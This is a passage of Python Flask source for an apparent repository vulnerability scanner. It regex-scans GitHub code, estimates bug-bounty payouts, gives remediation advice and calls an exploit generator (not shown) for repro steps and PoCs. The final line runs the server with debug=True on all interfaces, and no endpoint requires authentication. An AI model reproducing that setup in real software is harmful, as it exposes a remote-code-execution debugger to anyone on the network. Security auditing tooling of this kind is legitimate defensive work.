    'BUSINESS_LOGIC':  '$500 – $10,000',
    'FILE_INCLUSION':  '$1,000 – $10,000',
    'DESERIALIZATION': '$2,000 – $20,000',
    'RACE_CONDITION':  '$500 – $5,000',
}

REC_MAP = {
    'IDOR':             'Validate req.user.id === resource.ownerId server-side on EVERY request. Never trust client-supplied IDs.',
    'SQL_INJECTION':    'Use parameterized queries or ORM exclusively. Never concatenate user input into SQL.',
    'XSS':              'Escape all output. Use DOMPurify for HTML. Enforce strict Content-Security-Policy.',
    'SSRF':             'Allowlist outbound URLs. Block 169.254.x.x, 10.x, 127.x, ::1. Parse and validate host.',
    'FILE_UPLOAD':      'Validate MIME type server-side. Store outside webroot. Disable execution in upload directory.',
    'JWT':              'Always use jwt.verify() with a strong random secret. Reject alg=none and alg=HS256 if RS256 expected.',
    'CSRF':             'Add CSRF tokens to all state-changing requests. Use SameSite=Strict cookies.',
    'HARDCODED_SECRET': 'Move ALL secrets to environment variables. Rotate the exposed credential IMMEDIATELY.',
    'COMMAND_INJECTION':'Never pass user input to shell. Use execFile() with args array (not exec with shell=True).',
    'DESERIALIZATION':  'Never deserialize untrusted data. Use JSON with strict schema validation instead.',
    'RACE_CONDITION':   'Use database-level locks or atomic transactions for all financial operations.',
    'BUSINESS_LOGIC':   'Never trust client-supplied prices/quantities/roles. Always calculate server-side.',
    'WEAK_CRYPTO':      'Use bcrypt/argon2/scrypt for passwords. Use SHA-256+ for general hashing.',
    'MISCONFIG':        'Harden server configuration. Disable debug in production. Set security headers.',
    'AUTH':             'Never trust role/isAdmin from request body. Derive permissions from authenticated session only.',
    'RCE':              'NEVER pass user input to eval/exec/system. Use safe whitelisted alternatives.',
    'INJECTION':        'Never merge user input into objects directly. Use explicit field whitelists.',
    'NOSQL_INJECTION':  'Sanitize NoSQL query operators. Use strict type checking on query fields.',
    'LDAP':             'Sanitize all LDAP input. Use parameterized LDAP queries.',
    'XXE':              'Disable external entity loading. Use safe XML parser configurations.',
}

def analyze_vulnerability(vuln_type, snippet, intel, file_path=''):
    mitigations = []
    confidence  = 'CONFIRMED'

    # Step 0 — test file
    if intel.is_test_file(file_path):
        return 'INFORMATIONAL', ['Found in test/mock/fixture file — low exploitability']

    # Step 1 — inline sanitizer
    for pattern in INLINE_SANITIZERS.get(vuln_type, []):
        if re.search(pattern, snippet):
            return 'MITIGATED', ['Inline sanitization detected in the same snippet']

    # Step 2 — cross-file compensating controls
    if vuln_type == 'SSRF' and intel.check_ssrf_mitigation():
        mitigations.append('Global URL allowlist/filter detected — verify it covers this call')
        confidence = 'POSSIBLE'
    elif vuln_type == 'SQL_INJECTION':
        if intel.has_orm and 'raw' not in snippet.lower():
            return 'MITIGATED', ['ORM detected and no raw() call — parameterized by default']
        if intel.has_parameterized:
            mitigations.append('Parameterized queries exist — verify this is not a raw bypass')
            confidence = 'LIKELY'
    elif vuln_type == 'XSS' and intel.check_xss_mitigation():
        mitigations.append('Escape/DOMPurify/Helmet detected — verify this specific sink is covered')
        confidence = 'POSSIBLE'
    elif vuln_type == 'IDOR':
        # Logic flow: check for ownership enforcement
        if intel.has_ownership_check_near(snippet):
            return 'MITIGATED', ['Ownership check (req.user.id !==) detected near this code']
        if intel.has_auth_middleware:
            mitigations.append('Global auth middleware detected — verify it covers this route')
            confidence = 'POSSIBLE'
        if intel.route_has_auth(snippet):
            return 'MITIGATED', ['Route-level auth check found near this endpoint']
        # Ultra-confirm: no ownership check anywhere in repo
        if not intel.has_ownership_check:
            mitigations.insert(0, 'NO ownership check found ANYWHERE in the codebase — ULTRA-CONFIRMED IDOR')
            return 'ULTRA_CONFIRMED', mitigations
    elif vuln_type == 'JWT' and intel.has_jwt_verify:
        return 'MITIGATED', ['jwt.verify() found — token signature likely validated']
    elif vuln_type == 'CSRF' and intel.has_csrf:
        return 'MITIGATED', ['CSRF protection tokens detected in codebase']
    elif vuln_type == 'HARDCODED_SECRET':
        confidence = 'CONFIRMED'

    # Step 3 — cross-file taint trace
    var_match = re.search(r'\(\s*([a-zA-Z_][a-zA-Z0-9_]{1,40})\s*[,)]', snippet)
    if var_match and confidence not in ('MITIGATED', 'ULTRA_CONFIRMED'):
        var_name = var_match.group(1)
        tainted, source = intel.find_variable_assignment(var_name)
        if tainted:
            mitigations.insert(0, 'TAINT TRACE: "' + var_name + '" ← ' + str(source))
            confidence = 'CONFIRMED'

    # Step 4 — in-file variable follower (cross-line within same file)
    if confidence in ('POSSIBLE', 'LIKELY') and file_path and file_path in intel.files:
        var_match2 = re.search(r'\(\s*([a-zA-Z_][a-zA-Z0-9_]{1,40})\s*[,)]', snippet)
        if var_match2:
            var_name2 = var_match2.group(1)
            found, src_line, sink_line = intel.follow_variable(var_name2, intel.files[file_path])
            if found and sink_line:
                mitigations.insert(0,
                    'IN-FILE TRACE: "' + var_name2 + '" tainted at line ' + str(src_line or '?') +
                    ' → sink at line ' + str(sink_line))
                confidence = 'CONFIRMED'

    return confidence, mitigations

def scan(files_dict, repo_info=None):
    intel = RepoIntelligence(files_dict, categorize_files(files_dict))

    # Build per-file line offsets for accurate file attribution
    file_line_map = {}
    offset = 0
    for path, content in files_dict.items():
        n = content.count('\n') + 1
        file_line_map[path] = (offset, offset + n)
        offset += n + 1

    full_text = '\n'.join(files_dict.values())
    findings  = []

    for severity, title, vuln_type, pattern in VULN_CHECKS:
        if vuln_type == 'INFO':
            matches = list(re.finditer(pattern, full_text))
            if matches:
                m = matches[0]
                findings.append({
                    'severity':'INFO', 'title':title, 'file':None,
                    'line': str(full_text[:m.start()].count('\n')+1),
                    'description':'Found: `' + m.group()[:80] + '`',
                    'impact':'Informational finding.',
                    'recommendation':'Review if intentional.',
                    'confidence':'CONFIRMED', 'confidence_label':'INFO',
                    'mitigations':[], 'verdict':'Informational — review context.',
                    'payout':None, 'is_test_file':False,
                    'repro_steps':[], 'sandbox_curl':'', 'vuln_type':vuln_type,
                })
            continue

        matches = list(re.finditer(pattern, full_text, re.DOTALL))
        seen = set()

        for match in matches[:3]:
            snippet = match.group()[:180].strip()
            if snippet in seen:
                continue
            seen.add(snippet)

            abs_line = full_text[:match.start()].count('\n') + 1
            matched_file = next(
                (p for p, (s,e) in file_line_map.items() if s < abs_line <= e), None)

            is_test = intel.is_test_file(matched_file or '')
            confidence, mitigations = analyze_vulnerability(
                vuln_type, snippet, intel, matched_file or '')

            if confidence == 'MITIGATED':
                continue

            impact_map = {
                'CRITICAL':'Attacker can compromise the system, steal credentials, or execute arbitrary code.',
                'HIGH':    'Significant risk — data breach, account takeover, or privilege escalation.',
                'MEDIUM':  'Exploitable under certain conditions — should be fixed.',
                'LOW':     'Low risk alone but can be chained into a larger attack.',
            }

            verdict = ''
            if mitigations:
                first = mitigations[0]
                if 'TAINT' in first or 'TRACE' in first or 'ULTRA' in first:
                    verdict = first + ' — No compensating controls block this path.'
                else:
                    verdict = '; '.join(mitigations) + '. Verify controls cover this exact path.'
            else:
                verdict = 'No compensating controls detected. Treat as valid finding — reproduce manually.'

            repro_steps  = ExploitFactory.generate_repro_steps(vuln_type, snippet, matched_file or '', abs_line)
            sandbox_curl = ExploitFactory.generate_curl(vuln_type, snippet, matched_file or '')

            findings.append({
                'severity':         severity,
                'title':            title,
                'file':             matched_file,
                'line':             str(abs_line),
                'description':      'Found: `' + snippet + '`',
                'impact':           impact_map.get(severity,''),
                'recommendation':   REC_MAP.get(vuln_type,'Review and remediate.'),
                'confidence':       confidence,
                'confidence_label': CONFIDENCE_DISPLAY.get(confidence, ('',''))[0],
                'mitigations':      mitigations,
                'verdict':          verdict,
                'payout':           PAYOUT_ESTIMATES.get(vuln_type) if severity in ('CRITICAL','HIGH') and not is_test else None,
                'is_test_file':     is_test,
                'repro_steps':      repro_steps,
                'sandbox_curl':     sandbox_curl,
                'vuln_type':        vuln_type,
            })

    # Repo-level notes
    notes = []
    if intel.has_orm:              notes.append('ORM detected — raw SQL injection risk reduced')
    if intel.has_csrf:             notes.append('CSRF protection present')
    if intel.has_helmet:           notes.append('Security headers (Helmet/CSP) configured')
    if intel.has_rate_limit:       notes.append('Rate limiting detected')
    if intel.has_input_validation: notes.append('Input validation library (Joi/Zod/etc) detected')
    if intel.has_auth_middleware:  notes.append('Authentication middleware present')
    if intel.has_https_flag:       notes.append('Secure cookie flags detected')
    if intel.has_ownership_check:  notes.append('Ownership checks (req.user.id !==) detected')

    # Dedup + sort (ULTRA_CONFIRMED first)
    seen_keys = set()
    unique = []
    for f in findings:
        key = f['title'] + f['description'][:50]
        if key not in seen_keys:
            seen_keys.add(key)
            unique.append(f)

    order    = ['CRITICAL','HIGH','MEDIUM','LOW','INFO']
    conf_ord = {'ULTRA_CONFIRMED':0,'CONFIRMED':1,'LIKELY':2,'POSSIBLE':3,'INFORMATIONAL':4}
    unique.sort(key=lambda x: (order.index(x['severity']), conf_ord.get(x['confidence'],5)))

    stats = {'critical':0,'high':0,'medium':0,'low':0,'info':0}
    for f in unique:
        k = f['severity'].lower()
        if k in stats: stats[k] += 1

    score = max(0, 100 - stats['critical']*25 - stats['high']*12 - stats['medium']*6 - stats['low']*2)

    # Dependency map
    dep_map = {
        'dirty_files':     intel.get_top_dirty(6),
        'dangerous_files': intel.get_top_dangerous(6),
    }

    return unique, stats, score, notes, intel, dep_map

# ══════════════════════════════════════════════
# FLASK ROUTES
# ══════════════════════════════════════════════
@app.route('/search', methods=['POST'])
def search_web():
    data = request.json
    query = data.get('query','')
    try:
        from webscout import DuckDuckGoSearch
        ddg = DuckDuckGoSearch()
        results = ddg.text(query, max_results=5)
        out = ''
        for r in results[:5]:
            if isinstance(r, dict):
                out += r.get('title','') + ': ' + r.get('body','')[:200] + '\n'
        return jsonify({'results': out or 'No results'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/gather-repo', methods=['POST'])
def gather_repo_info():
    data  = request.json
    owner = data.get('owner')
    repo  = data.get('repo')
    try:
        repo_info = gh('https://api.github.com/repos/' + owner + '/' + repo)
        if repo_info.get('message') == 'Not Found':
            return jsonify({'error':'Repository not found'}), 404
        if 'rate limit' in str(repo_info.get('message','')).lower():
            return jsonify({'error':'GitHub rate limit — set GITHUB_TOKEN env variable'}), 429

        readme     = gh('https://api.github.com/repos/' + owner + '/' + repo + '/readme')
        file_paths = get_repo_files(owner, repo)

        # Smart monorepo fetcher — gets full tree then filters security-relevant files
        try:
            tree_resp = requests.get(
                'https://api.github.com/repos/' + owner + '/' + repo + '/git/trees/HEAD?recursive=1',
                headers=GH_HEADERS)
            tree_data = tree_resp.json()

            SECURITY_KEYWORDS = [
                'route','router','controller','handler','middleware','auth',
                'permission','policy','service','upload','sanitize','validate',
                'session','token','password','user','admin','api','login',
                'register','reset','oauth','jwt','acl','rbac','access',
            ]
            SKIP_TREE = [
                'dist/','node_modules','.test.','.spec.','__tests__','__mocks__',
                'coverage','fixtures','storybook','.stories.','.d.ts',
                'templates/','examples/','docs/','changelog',
            ]
            PRIORITY_EXTS = ['.ts','.js','.tsx','.jsx','.py','.php','.go','.rb','.java']

            security_files = []
            for item in tree_data.get('tree', []):
                p    = item.get('path','')
                plow = p.lower()
                if item.get('type') != 'blob':
                    continue
                if any(s in plow for s in SKIP_TREE):
                    continue
                if not any(plow.endswith(e) for e in PRIORITY_EXTS):
                    continue
                if any(k in plow for k in SECURITY_KEYWORDS):
                    security_files.append(p)

            # Sort: shortest paths first (core files), then alphabetical
            security_files.sort(key=lambda x: (len(x.split('/')), x))

            # Add top 180 security-relevant files to fetch list
            file_paths = security_files[:180]
        except:
            pass

        extra = [
            'package.json','requirements.txt','.env.example','config.js','config.py',
            'app.js','app.py','index.js','server.js','main.py','main.go',
            '.gitignore','Dockerfile','docker-compose.yml','settings.py',
            'login.php','config.php','index.php','pom.xml',
            'routes/auth.js','routes/user.js','routes/api.js','routes/index.js',
            'middleware/auth.js','middleware/index.js','middleware/authorization.js',
            'controllers/userController.js','controllers/authController.js',
            'src/routes.ts','src/middleware.ts','src/auth.ts','src/controllers.ts',
        ]
        all_paths = list(dict.fromkeys(extra + file_paths))[:130]

        files_dict = {}
        for path in all_paths:
            try:
                content = get_file(owner, repo, path)
                txt = decode_content(content)
                if txt:
                    files_dict[path] = txt[:4000]
            except:
                pass

        if readme and readme.get('content'):
            try:
                txt = base64.b64decode(readme['content']).decode('utf-8', errors='ignore')
                files_dict['README.md'] = txt[:2000]
            except:
                pass

        summary  = 'Repository: ' + owner + '/' + repo + '\n'
        summary += 'Stars: '        + str(repo_info.get('stargazers_count',0)) + '\n'
        summary += 'Language: '     + str(repo_info.get('language',''))         + '\n'
        summary += 'Description: '  + str(repo_info.get('description',''))      + '\n\n'

        return jsonify({'gathered':summary,'files_dict':files_dict,'repo_info':repo_info})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/analyze', methods=['POST'])
def analyze_security():
    data         = request.json
    files_dict   = data.get('files_dict',{})
    repo_info    = data.get('repo_info',{})
    code_context = data.get('code','')
    repo_name    = data.get('repo_name','unknown/repo')
    if not files_dict and code_context:
        files_dict = {'code': code_context}
    try:
        findings, stats, score, notes, intel, dep_map = scan(files_dict, repo_info)

        positives = list(notes) or ['Repository scanned successfully']

        confirmed       = sum(1 for f in findings if f['confidence'] in ('CONFIRMED','ULTRA_CONFIRMED'))
        ultra_confirmed = sum(1 for f in findings if f['confidence'] == 'ULTRA_CONFIRMED')
        likely          = sum(1 for f in findings if f['confidence'] == 'LIKELY')
        taint_traced    = sum(1 for f in findings if any('TAINT' in m or 'TRACE' in m for m in f.get('mitigations',[])))

        summary = (
            'Analyzed ' + str(len(files_dict)) + ' files. '
            'Found ' + str(len(findings)) + ' issue(s) — '
            + str(confirmed) + ' confirmed'
            + (' (' + str(ultra_confirmed) + ' ULTRA)' if ultra_confirmed else '') + ', '
            + str(taint_traced) + ' taint-traced, '
            + str(likely) + ' likely. '
            'Score: ' + str(score) + '/100. '
            + ('🚨 CRITICAL issues!' if stats['critical'] > 0
               else '⚠️ High severity found.' if stats['high'] > 0
               else '✓ No critical issues.')
        )

        # Generate PoC markdown for top confirmed findings
        for f in findings:
            if f['confidence'] in ('CONFIRMED','ULTRA_CONFIRMED') and f['severity'] in ('CRITICAL','HIGH'):
                f['poc_markdown'] = ExploitFactory.generate_markdown_report(f, repo_name)
            else:
                f['poc_markdown'] = None

        result = {
            'summary':         summary,
            'score':           score,
            'vulnerabilities': findings,
            'positives':       positives,
            'stats':           stats,
            'dep_map':         dep_map,
            'intel': {
                'has_orm':              intel.has_orm,
                'has_csrf':             intel.has_csrf,
                'has_auth_middleware':  intel.has_auth_middleware,
                'has_input_validation': intel.has_input_validation,
                'has_rate_limit':       intel.has_rate_limit,
                'has_ownership_check':  intel.has_ownership_check,
            }
        }
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print('RepoAudit Mega Ultra Ultimate Intelligence Engine — port 5000')
    app.run(host='0.0.0.0', port=5000, debug=True)
